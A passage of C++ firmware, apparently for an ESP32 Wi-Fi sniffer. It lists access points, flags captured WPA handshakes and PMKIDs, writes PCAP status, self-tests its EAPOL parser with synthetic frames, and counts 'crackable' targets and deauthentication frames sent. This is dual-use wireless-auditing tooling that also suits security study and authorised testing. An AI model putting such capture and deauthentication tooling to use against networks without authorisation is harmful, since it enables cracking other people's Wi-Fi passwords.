  Serial.printf("%-3s %-32s %-17s %2s %4s %-7s %s\n",
                "#", "SSID", "BSSID", "CH", "dBm", "ENC", "HS PMK");
  for (int i = 0; i < g_apCount; i++) {
    ApInfo &a = g_aps[i];
    char bssid[18];
    macStr(a.bssid, bssid);
    Serial.printf("%-3d %-32.32s %-17s %2d %4d %-7s %s %s\n",
                  i, a.ssid[0] ? a.ssid : "<hidden>", bssid, a.channel,
                  a.rssi, authName(a.auth),
                  a.handshake ? "Y" : ".", a.pmkid ? "Y" : ".");
  }
}

void snifferPrintPcap() {
  Serial.printf("{\"t\":\"pcap\",\"path\":\"%s\",\"size\":%u,\"open\":%d,\"sd\":%d}\n",
                g_pcapPath, (unsigned)g_pcapSize, g_pcapOk ? 1 : 0, g_sdOk ? 1 : 0);
}

// Feed a synthetic M1+M2 and a PMKID through the same parser used for real
// frames. This proves the handshake state machine without transmitting
// anything. It changes the counters, so run `clear` afterwards.
void snifferSelfTest() {
  static const uint8_t ap[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
  static const uint8_t sta[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x02};
  uint8_t frame[160];

  auto build = [&](bool fromAp, uint16_t keyInfo, bool withPmkid) {
    int n = 0;
    frame[n++] = 0x08;
    frame[n++] = fromAp ? 0x02 : 0x01;
    frame[n++] = 0x00;
    frame[n++] = 0x00;

    const uint8_t *a1 = fromAp ? sta : ap;
    const uint8_t *a2 = fromAp ? ap : sta;
    memcpy(frame + n, a1, 6); n += 6;
    memcpy(frame + n, a2, 6); n += 6;
    memcpy(frame + n, ap, 6); n += 6;
    frame[n++] = 0x00;
    frame[n++] = 0x00;

    static const uint8_t llc[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    memcpy(frame + n, llc, 8);
    n += 8;

    uint8_t *e = frame + n;
    int kdLen = withPmkid ? 22 : 0;
    int bodyLen = 95 + kdLen;

    e[0] = 0x02;  // EAPOL version
    e[1] = 0x03;  // EAPOL-Key
    e[2] = bodyLen & 0xFF;
    e[3] = (bodyLen >> 8) & 0xFF;
    e[4] = 0x02;  // RSN key descriptor
    e[5] = keyInfo & 0xFF;
    e[6] = (keyInfo >> 8) & 0xFF;
    e[7] = 0x10;  // key length 16
    e[8] = 0x00;
    memset(e + 9, 0, 8);   // replay counter
    for (int i = 0; i < 32; i++) e[17 + i] = (uint8_t)(i + 1);  // nonce
    memset(e + 49, 0, 16); // IV
    memset(e + 65, 0, 8);  // RSC
    memset(e + 73, 0, 8);  // ID
    memset(e + 81, 0, 16); // MIC
    e[97] = kdLen & 0xFF;
    e[98] = (kdLen >> 8) & 0xFF;

    if (withPmkid) {
      uint8_t *kd = e + 99;
      kd[0] = 0xDD;
      kd[1] = 0x14;
      kd[2] = 0x00;
      kd[3] = 0x0F;
      kd[4] = 0xAC;
      kd[5] = 0x04;
      for (int i = 0; i < 16; i++) kd[6 + i] = (uint8_t)(0xA0 + i);
    }

    n += 99 + kdLen;
    processEapol(frame, n, -50, 6);
  };

  build(true, 0x002A, true);   // M1, with PMKID KDE
  build(false, 0x004A, false); // M2
  Serial.println("{\"t\":\"selftest\",\"ok\":1,\"stored\":0}");
}

void snifferDebugRaw(int index) {
  if (index < 0 || index >= g_apCount) {
    Serial.println("{\"t\":\"error\",\"msg\":\"bad AP index\"}");
    return;
  }
  memcpy(g_debugBssid, g_aps[index].bssid, 6);
  g_debugRaw = true;
  g_debugParse = true;
  char bssid[18];
  macStr(g_debugBssid, bssid);
  Serial.printf("{\"t\":\"rawwait\",\"bssid\":\"%s\"}\n", bssid);
}

void snifferClearCounts() {
  g_hsCount = 0;
  // Do not reset g_savedHsCount: clear does not erase the PCAP, so SAVED
  // must keep describing what is actually in the current session file.
  g_pmkidCount = 0;
  g_eapolCount = 0;
  g_deauthSent = 0;
  g_drops = 0;
  for (int i = 0; i < MAX_HS; i++) g_hs[i].reported = false;
  for (int i = 0; i < g_apCount; i++) {
    g_aps[i].handshake = false;
    g_aps[i].pmkid = false;
  }
  Serial.println("{\"t\":\"clear\",\"ok\":1}");
}

SnifferStats snifferStats() {
  SnifferStats s = {};
  s.apCount = g_apCount;
  s.hsCount = g_hsCount;
  s.savedHsCount = g_savedHsCount;
  s.pmkidCount = g_pmkidCount;
  s.eapolCount = g_eapolCount;
  s.drops = (int)g_drops;
  s.channel = g_channel;
  s.sdOk = g_sdOk;
  s.paused = g_paused;
  s.lockMode = g_lockMode;
  s.boost = g_boost;
  s.pcapSize = (int)g_pcapSize;
  s.deauthSent = g_deauthSent;

  int targets = 0;
  int best = -1;
  int8_t bestRssi = -128;
  for (int i = 0; i < g_apCount; i++) {
    if (isCrackableAuth(g_aps[i].auth)) targets++;
    if (!g_aps[i].hidden && g_aps[i].rssi > bestRssi) {
      bestRssi = g_aps[i].rssi;
      best = i;
    }
  }
  if (best < 0) {
    // All visible APs are hidden: still show the strongest signal.
    for (int i = 0; i < g_apCount; i++) {
      if (g_aps[i].rssi > bestRssi) {
        bestRssi = g_aps[i].rssi;
        best = i;
      }
    }
  }
  s.targetCount = targets;
  if (best >= 0) {
    strlcpy(s.lastSsid, g_aps[best].ssid, sizeof(s.lastSsid));
    s.lastRssi = g_aps[best].rssi;
  } else {
    s.lastSsid[0] = 0;
    s.lastRssi = 0;
  }

  s.hasTarget = g_hasTarget;
  if (g_hasTarget) {
    memcpy(s.targetBssid, g_targetBssid, 6);
    strlcpy(s.targetSsid, g_targetSsid, sizeof(s.targetSsid));
    s.targetChannel = g_targetChannel;
    s.targetRssi = g_targetRssi;
  }
  return s;
}
